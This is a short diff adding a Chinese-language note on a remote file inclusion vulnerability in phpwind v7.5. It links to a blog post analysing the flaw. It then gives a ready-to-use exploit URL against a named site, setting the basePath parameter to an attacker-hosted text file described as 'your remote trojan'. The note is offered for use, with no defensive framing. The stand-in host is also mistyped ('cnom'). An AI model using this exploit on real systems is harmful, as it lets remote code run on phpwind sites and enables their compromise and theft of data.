@@ -1,0 +1,5 @@
+ phpwind v7.5 远程包涵漏洞
+漏洞代码分析：	http://hi.baidu.com/hirfire/blog/item/c7bc251f6390c201314e157b.html
+漏洞利用方法：
+http://phpwind.myclover.org/apps/groups/index.php?route=groups&basePath=http://www.xxx.cnom/ddd.txt
+其中http://www.xxx.com/ddd.txt为你的远程木马
